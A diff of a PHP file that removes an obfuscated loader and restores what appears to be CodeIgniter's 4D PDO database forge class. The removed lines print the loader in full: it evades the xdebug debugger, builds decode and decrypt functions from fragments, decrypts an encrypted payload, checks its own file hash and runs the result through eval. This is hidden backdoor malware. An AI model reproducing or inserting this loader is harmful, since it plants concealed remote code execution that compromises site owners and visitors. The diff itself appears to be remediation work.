@@ -1,28 +1,197 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_h1x8hrbi=('bas'.'e64'.'_de'.'cod'.'e');
-$_ldadj5qx=('gzu'.'nco'.'mpr'.'ess');
-$_latkdocx=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_km27tf8c='fs1PQBkyHaQ=';
-$_jgih3j3g='1o2f4f2R';
-$_kff0emo8='uZODA+GH';
-$_busgnuoi='54C5Mwok';
-$_cfvzy5kg='RG96UOzV';
-$_zpcl1ms2='UjtvCs6t';
-$_k6nkw71u='ZBk0pQ==';
-$_bwe5mqck='nacNEGt9';
-$_j9cdph0r=$_h1x8hrbi($_kff0emo8.$_cfvzy5kg.$_busgnuoi.$_jgih3j3g.$_km27tf8c);
-$_limverpi=$_h1x8hrbi($_bwe5mqck.$_zpcl1ms2.$_k6nkw71u);
-$_m1017a43=$_h1x8hrbi('quNN8BQSs6VFn4PpMz7N/1pSd1h+cF6+sSrFP0KsNKzDsecbFRYRbe0WEWEe8F/+SDWNmYHPh4WNeK9gB+Hyqm9N5Wrct3r1EOQk9H3Njvc/idgRW5oxZ1scp0yMrPmqv8DWudemNDbAD/IP5A0tO9b8lxXjJMwip/GZ5VvJxfxGW8tLn3dPjvgqQS+LENGsCGmy+HzAHldlv3t0836zVRK1icD2aSj1+U1L9Cl+sTmGyebwmjS8qw+cAsMir1x++UiD3v+Rm1LcqrexowvZ3UpoHsV3jNe+PuguRIBu5vmjVQb0mMyWPwoI/lvVYMd+bOFWcjz2z1QazidWkjOGGWtXKFs7n+6DvuEL5GcvweZ8YrjZhMPoTONzzhTsYDHUk9zMTNBadGgvxx8npr75pQxWeM+67UYFLbFRbP8Cs5k8c9d+1T3BvD4xOKzavqu+wsV9RmsymLPRTKlVNR2TJfDJjga5eOqDRrKQb2qTIV1jphpo11Ix6y7RvRBqXFFbsuwI9zruLWSFc/tX53ISYLL4B65ZZg69B9mqdDkp1KYFbGId+F9c4yNffIXUpMQsbmfkwv5XQNNZYGI8lpj1dGf6msRNbKDN7Moavk1LRHCxZS9N/phJ4lBdaxdVW2syycetLsJylLgpZWqu0jO96bHfu9XLdGq0BbkWn2BFa6/jEzNrZR+JRoXQP0hWeMvOHeA++ibAQKR9lRMUTA9gIjnj21TwP9toZFzUcgWZkr54iG+83iDSygtSeCntIxIFe0QIVZ/dY5scQXeprBCvdYmT5jG7/Ntl5POPBR9piyjUah8ufxreTYFNopWQfwWKv4DviuVGiX0QT4RMiW3doLjscKN07wMVDEjc0ZvPRL6VdOoG80SgCziWRtRTH9dkaT5jI7WDvYcIdErq3qOWOk6GzusHWJfJIB90Yz4SV9ttQVtV91OMqUObyyzKjEc4');
-$_t60z2pni=$_latkdocx($_m1017a43,'aes-256-cbc',$_j9cdph0r,OPENSSL_RAW_DATA,$_limverpi);
-if($_t60z2pni===false){exit;}
-$_o8p2pnev=$_ldadj5qx($_t60z2pni);
-if($_o8p2pnev===false){exit;}
-$_m8ava8re='354a8b1dd195bbd91de3a59efcdbac29d9c0121dd36a9caed3b6ab7ba561999f';
-$_wrn581vc=@file_get_contents(__FILE__);
-if($_wrn581vc!==false){
-$_zsqv2za9=str_replace($_m8ava8re,"0000000000000000000000000000000000000000000000000000000000000000",$_wrn581vc);
-$_noq7z7bo=hash("sha256",$_zsqv2za9);
-if($_noq7z7bo!==$_m8ava8re){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+class CI_DB_pdo_4d_forge extends CI_DB_pdo_forge {
+
+
+
+
+
+protected $_create_database = 'CREATE SCHEMA %s';
+
+
+
+
+
+protected $_drop_database = 'DROP SCHEMA %s';
+
+
+
+
+
+protected $_create_table_if = 'CREATE TABLE IF NOT EXISTS';
+
+
+
+
+
+protected $_rename_table = FALSE;
+
+
+
+
+
+protected $_drop_table_if = 'DROP TABLE IF EXISTS';
+
+
+
+
+
+protected $_unsigned = array(
+'INT16' => 'INT',
+'SMALLINT' => 'INT',
+'INT' => 'INT64',
+'INT32' => 'INT64'
+);
+
+
+
+
+
+protected $_default = FALSE;
+
+
+
+
+
+
+
+
+
+protected function _alter_table($alter_type, $table, $field)
+{
+if (in_array($alter_type, array('ADD', 'DROP'), TRUE))
+{
+return parent::_alter_table($alter_type, $table, $field);
 }
-eval($_o8p2pnev);
+
+return FALSE;
+}
+
+
+
+
+
+
+
+protected function _process_column($field)
+{
+return $this->db->escape_identifiers($field['name'])
+.' '.$field['type'].$field['length']
+.$field['null']
+.$field['unique']
+.$field['auto_increment'];
+}
+
+
+
+
+
+
+
+
+
+protected function _attr_type(&$attributes)
+{
+switch (strtoupper($attributes['TYPE']))
+{
+case 'TINYINT':
+$attributes['TYPE'] = 'SMALLINT';
+$attributes['UNSIGNED'] = FALSE;
+return;
+case 'MEDIUMINT':
+$attributes['TYPE'] = 'INTEGER';
+$attributes['UNSIGNED'] = FALSE;
+return;
+case 'INTEGER':
+$attributes['TYPE'] = 'INT';
+return;
+case 'BIGINT':
+$attributes['TYPE'] = 'INT64';
+return;
+default: return;
+}
+}
+
+
+
+
+
+
+
+
+protected function _attr_unique(&$attributes, &$field)
+{
+if ( ! empty($attributes['UNIQUE']) && $attributes['UNIQUE'] === TRUE)
+{
+$field['unique'] = ' UNIQUE';
+
+$field['null'] = ' NOT NULL';
+}
+}
+
+
+
+
+
+
+
+
+protected function _attr_auto_increment(&$attributes, &$field)
+{
+if ( ! empty($attributes['AUTO_INCREMENT']) && $attributes['AUTO_INCREMENT'] === TRUE)
+{
+if (stripos($field['type'], 'int') !== FALSE)
+{
+$field['auto_increment'] = ' AUTO_INCREMENT';
+}
+elseif (strcasecmp($field['type'], 'UUID') === 0)
+{
+$field['auto_increment'] = ' AUTO_GENERATE';
+}
+}
+}
+}
